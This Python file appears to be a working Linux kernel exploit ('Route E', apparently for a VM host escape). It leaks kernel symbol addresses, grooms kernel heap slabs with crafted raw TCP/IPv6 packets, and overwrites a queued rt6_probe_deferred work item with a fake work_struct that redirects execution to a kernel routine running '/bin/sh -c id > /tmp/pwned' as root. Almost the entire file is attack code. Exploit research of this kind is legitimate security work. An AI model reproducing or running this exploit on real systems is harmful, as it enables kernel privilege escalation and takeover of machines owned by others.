#!/usr/bin/env python3
# r6e.py -- Route E: host-fixture R6 root path driven by the CO-RE observer
# (r6obs) instead of bpftrace.  No bpftrace, no kcore.
#
# Observer provides:
#   QUEUE <work> <pwq> <data> <poolhead> <poolhead> <func> <cpu> <ts>
#   EXEC  <work> <cpu> <ts>            (marks the work dequeued)
#   ECHO  <dopt> <sport> <ts>          (ip_options_rcu allocation for a SYN)
#
# usage: r6e.py dry|fire [attempts] [n] [gw0]
import os, sys, time, struct, socket, subprocess, re

DEV = "r6a"; PEER = "r6b"
SRC4 = bytes([172, 31, 99, 2]); DST4 = bytes([10, 99, 0, 1])
OBS = "/opt/pwnescape/tools/r6obs"
OBJLOG = "/tmp/r6obs.log"
EXEC_OFF = 0x12ec10
RET_OFF = 0x126c330
RT6_OFF = 0x10cbfd0
# R6_ROUTE_MODE=nh selects the nexthop-object route, i.e. the second compiled
# find_match()/rt6_probe callsite (different kmalloc-rnd cache per boot).
ROUTE_MODE = os.environ.get("R6_ROUTE_MODE", "plain")


def sh(c, to=60):
    return subprocess.run(c, shell=True, capture_output=True, text=True, timeout=to)


def ksym(n):
    out = sh("grep -w %s /proc/kallsyms | head -1" % n).stdout.split()
    return int(out[0], 16) if out else 0


# ---------- frame builders (same as r6hpoc) ----------
def csum(d):
    if len(d) % 2:
        d += b"\0"
    s = sum(struct.unpack(">%dH" % (len(d) // 2), d))
    while s >> 16:
        s = (s & 0xffff) + (s >> 16)
    return (~s) & 0xffff


def csum_partial(d):
    s = 0; i = 0
    while i + 1 < len(d):
        s += d[i] | (d[i + 1] << 8); i += 2
    if i < len(d):
        s += d[i]
    return s


def csum_fold(s):
    s = (s & 0xffff) + (s >> 16); s = (s & 0xffff) + (s >> 16)
    return (~s) & 0xffff


def htons(v):
    return ((v << 8) | (v >> 8)) & 0xffff


def _peer():
    try:
        return bytes.fromhex(open("/sys/class/net/%s/address" % PEER).read().strip().replace(":", ""))
    except Exception:
        return b"\xff" * 6


def frame(sport, seq, wire=None, payload=b"\x41" * 64, rst=False):
    hl = 20 if rst else 32
    thlen = 20
    ip = bytearray(hl + thlen + len(payload))
    ip[0] = 0x40 | (hl // 4)
    struct.pack_into(">H", ip, 2, len(ip))
    struct.pack_into(">H", ip, 4, 0x4242)
    ip[8] = 64; ip[9] = 6
    ip[12:16] = SRC4; ip[16:20] = DST4
    if not rst:
        ip[20] = 7; ip[21] = 11; ip[22] = 12
        for i in range(23, 31):
            ip[i] = 0x40 + i
        ip[31] = 0
    th = memoryview(ip)[hl:]
    struct.pack_into(">HHII", th, 0, sport, 7778, seq & 0xffffffff, 0)
    th[12] = 5 << 4
    th[13] = 0x04 if rst else 0x02
    struct.pack_into(">H", th, 14, 0x4000)
    if not rst:
        th[thlen:] = payload
    pseudo = SRC4 + DST4 + b"\0" + bytes([6]) + struct.pack(">H", thlen + len(payload))
    seg = pseudo + bytes(th[:thlen + len(payload)])
    struct.pack_into(">H", th, 16, csum(seg))
    vhdr = bytearray(10)
    if wire is not None:
        want = htons(wire)
        for w in range(65536):
            ip[25] = w & 0xff; ip[26] = (w >> 8) & 0xff
            if csum_fold(csum_partial(bytes(ip[21:]))) == want:
                break
        struct.pack_into(">H", ip, 10, 0)
        struct.pack_into(">H", ip, 10, csum(bytes(ip[:hl])))
        vhdr[0] = 1
        struct.pack_into("<H", vhdr, 6, 14 + 21)
    else:
        struct.pack_into(">H", ip, 10, 0)
        struct.pack_into(">H", ip, 10, csum(bytes(ip[:hl])))
    eth = _peer() + bytes.fromhex("020000000002") + struct.pack(">H", 0x0800)
    return bytes(vhdr) + eth + bytes(ip)


def sock():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((DEV, 0))
    s.setsockopt(263, 15, 1)
    return s


def work_payload(B, pwq, stext, poolhead):
    p = bytearray(192)
    struct.pack_into("<Q", p, 0, pwq | 0x5)
    struct.pack_into("<Q", p, 8, poolhead)
    struct.pack_into("<Q", p, 16, poolhead)
    struct.pack_into("<Q", p, 24, stext + EXEC_OFF)
    struct.pack_into("<Q", p, 32, 0)
    struct.pack_into("<Q", p, 40, B + 128)
    struct.pack_into("<Q", p, 48, B + 160)
    struct.pack_into("<Q", p, 56, B + 184)
    struct.pack_into("<I", p, 64, 2)
    p[128:136] = b"/bin/sh\0"
    p[136:140] = b"-c\0\0"
    cmd = b"id > /tmp/pwned\0"
    p[140:140 + len(cmd)] = cmd
    struct.pack_into("<4Q", p, 160, B + 128, B + 136, B + 140, 0)
    return bytes(p)


def dry_payload(B, pwq, stext, poolhead):
    p = bytearray(64)
    struct.pack_into("<Q", p, 0, pwq | 0x5)
    struct.pack_into("<Q", p, 8, poolhead)
    struct.pack_into("<Q", p, 16, poolhead)
    struct.pack_into("<Q", p, 24, stext + RET_OFF)
    return bytes(p)


def probe6(gw, s6):
    icmp = struct.pack(">BBHHH", 128, 0, 0, 0x1234, 0) + b"R6R6"
    s6.sendto(icmp, ("fd01:0:%x::1" % gw, 0, 0, 0))


def parse_obs():
    q = []; x = []; e = []
    try:
        lines = open(OBJLOG, errors="ignore").read().splitlines()
    except Exception:
        return q, x, e
    for ln in lines:
        p = ln.split()
        if not p:
            continue
        if p[0] == "QUEUE" and len(p) >= 8:
            q.append((int(p[1], 16), int(p[2], 16), int(p[4], 16), int(p[6], 16), int(p[7])))
        elif p[0] == "EXEC" and len(p) >= 4:
            x.append((int(p[1], 16), int(p[2], 16), int(p[3]), int(p[4])))
        elif p[0] == "ECHO" and len(p) >= 4:
            e.append((int(p[1], 16), int(p[2]), int(p[4])) if len(p) >= 5 else (int(p[1], 16), int(p[2]), int(p[3])))
    return q, x, e


def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else "dry"
    att = int(sys.argv[2]) if len(sys.argv) > 2 else 2
    n = int(sys.argv[3]) if len(sys.argv) > 3 else 24
    gw0 = int(sys.argv[4], 0) if len(sys.argv) > 4 else 0x2000
    try:
        os.sched_setaffinity(0, {7})
    except Exception as e:
        print("affinity:", e, flush=True)
    stext = ksym("_stext")
    rt6 = ksym("rt6_probe_deferred")
    print("mode=%s stext=%#x rt6=%#x" % (mode, stext, rt6), flush=True)
    if not rt6:
        print("no rt6_probe_deferred symbol"); return 1
    # fixtures: routes + failed neighbours for the probe gateways
    gws = [gw0 + i for i in range(att)]
    warm = [gw0 - 1 - i for i in range(3)]
    gates = [gw0 + 0x800 + i for i in range(max(8, att * 8))]
    est = [gw0 + 0x900 + i for i in range(max(1, att))]
    for g in gws + warm + gates + est:
        if ROUTE_MODE == "nh":
            nhid = 20000 + (g & 0xffff)
            sh("ip nexthop del id %d 2>/dev/null" % nhid)
            sh("ip nexthop add id %d via fe80::%x dev virbr-pwn 2>/dev/null" % (nhid, g))
            sh("ip -6 route replace fd01:0:%x::/64 nhid %d 2>/dev/null" % (g, nhid))
        else:
            sh("ip -6 route replace fd01:0:%x::/64 via fe80::%x dev virbr-pwn 2>/dev/null" % (g, g))
        sh("ip -6 neigh replace fe80::%x lladdr 02:00:00:00:00:01 dev virbr-pwn nud failed 2>/dev/null" % g)
    print("route_mode=%s" % ROUTE_MODE, flush=True)
    print("aging 11.6s", flush=True)
    time.sleep(11.6)
    # start observer
    sh("pkill -x r6obs"); time.sleep(0.2)
    open(OBJLOG, "w").close()
    obs = subprocess.Popen([OBS, "%x" % rt6], stdout=open(OBJLOG, "w"), stderr=subprocess.STDOUT)
    for _ in range(50):
        if "READY" in open(OBJLOG, errors="ignore").read():
            break
        time.sleep(0.1)
    time.sleep(0.2)
    s6 = socket.socket(socket.AF_INET6, socket.SOCK_RAW, 58)
    s6.bind(("fd00:1::1", 0))
    s = sock()
    # warmup: one rt6 work -> pwq/poolhead
    probe6(warm[0], s6)
    time.sleep(0.1)
    q, x, e = parse_obs()
    if not q:
        print("no QUEUE from observer; abort", flush=True); obs.terminate(); return 1
    work, pwq, poolhead, func, cpu = q[-1]
    print("observer warmup: work=%#x pwq=%#x poolhead=%#x func=%#x cpu=%d" % (work, pwq, poolhead, func, cpu), flush=True)
    if func != rt6:
        print("warmup func mismatch; abort", flush=True); obs.terminate(); return 1
    base0 = 25000 + (int(time.time()) % 300) * 96
    for a in range(att):
        base = base0 + a * 40
        seqbase = (0x30000000 + (base0 << 4) + a * 0x10000) & 0xffffffff
        # exhaust the current active slab so the real victims start on the
        # page the next probe work will also use.
        NFILL = 100
        fb = base + 1000
        for i in range(NFILL):
            s.send(frame(fb + i, (seqbase + 0x20000 + i) & 0xffffffff))
        for i in range(n):
            s.send(frame(base + i, (seqbase + i) & 0xffffffff))
        time.sleep(0.03)
        q, x, e = parse_obs()
        ev = [(t, ad, sp) for (ad, sp, t) in e if base <= sp < base + n]
        if len(ev) < 4:
            print("att %d: only %d ECHO victims" % (a, len(ev)), flush=True); continue
        last = max(ev, key=lambda z: z[0])[1]
        page = last & ~0xfff
        cand = {ad: sp for (t, ad, sp) in ev if (ad & ~0xfff) == page}
        pairs = [(y, y + 64) for y in cand if (y + 64) in cand]
        if not pairs:
            print("att %d: no adjacent pair on page %#x (%d victims)" % (a, page, len(cand)), flush=True); continue
        if mode == "fire":
            safe = [p for p in pairs if (p[1] + 128) in cand]
            if not safe:
                print("att %d: no safe pair (X+128 victim)" % a, flush=True); continue
            pairs = safe
        pairs.sort(key=lambda p: (p[1] + 64 in cand, p[1] + 128 in cand), reverse=True)
        # page-active gate: retry spare probes until one lands on the victims'
        # page (the per-CPU active slab rotates between pages).
        nq = len(q)
        gate_ok = False
        seen = None
        for j in range(8):
            probe6(gates[a * 8 + j], s6)
            time.sleep(0.02)
            q, x, e = parse_obs()
            qn = q[nq:]
            nq = len(q)
            if qn:
                seen = qn[-1][0] & ~0xfff
                if seen == page:
                    gate_ok = True
                    break
        if not gate_ok:
            print("att %d: page gate failed (last probe page %s vs victim page %#x)" % (
                a, hex(seen) if seen else None, page), flush=True)
            continue
        Y, X = pairs[0]
        sx = cand[X] if X in cand else None
        sy = cand[Y]
        if sx is None:
            # X = Y+64 is a dopt too? cand has it by construction (pairs from cand)
            print("att %d: X not a victim?" % a, flush=True); continue
        seqx = (seqbase + (sx - base)) & 0xffffffff
        seqy = (seqbase + (sy - base)) & 0xffffffff
        ovs = 40000 + (int(time.time()) % 1000) + a
        ovq = 0x50000000 + (int(time.time()) % 0x1000) * 256 + a
        val = 0x6000 if mode == "dry" else 0xE000
        pay = dry_payload(X, pwq, stext, poolhead) if mode == "dry" else work_payload(X, pwq, stext, poolhead)
        fr_y = frame(sy, (seqy + 1) & 0xffffffff, rst=True)
        fr_x = frame(sx, (seqx + 1) & 0xffffffff, rst=True)
        fr_ov = frame(ovs, ovq, wire=val, payload=pay)
        icmp = struct.pack(">BBHHH", 128, 0, 0, 0x1234, 0) + b"R6R6"
        dst6 = ("fd01:0:%x::1" % gws[a], 0, 0, 0)
        old = os.sched_getscheduler(0)
        try:
            os.sched_setscheduler(0, os.SCHED_FIFO, os.sched_param(50))
            t0 = time.time()
            s.send(fr_y)
            s.send(fr_x)
            s6.sendto(icmp, dst6)
            s.send(fr_ov)
            dt = (time.time() - t0) * 1e6
        finally:
            os.sched_setscheduler(0, old, os.sched_param(0))
        time.sleep(0.6)
        pwn = os.path.exists("/tmp/pwned")
        q2, x2, e2 = parse_obs()
        want = stext + (RET_OFF if mode == "dry" else EXEC_OFF)
        wq_x = [f for (w, f, c, t) in x2 if w == X]
        hij = any(f == want for (w, f, c, t) in x2 if w == X)
        qx = [w for (w, pw, po, fu, cp) in q2 if w == X]
        print("att %d %s gw=%#x X=%#x Y=%#x sx=%d sy=%d pwq=%#x ph=%#x dt=%.0fus "
              "queuedX=%s execX_func=%s hijack=%s pwned=%s" % (
                  a, mode.upper(), gws[a], X, Y, sx, sy, pwq, poolhead, dt,
                  [hex(z) for z in qx], [hex(z) for z in wq_x[:2]], hij, pwn), flush=True)
        if pwn:
            print("== PWND ==", flush=True)
            print(sh("cat /tmp/pwned; id; hostname").stdout, flush=True)
            obs.terminate(); return 0
        time.sleep(0.2)
    print("done", flush=True)
    obs.terminate()
    return 0


if __name__ == "__main__":
    sys.exit(main())
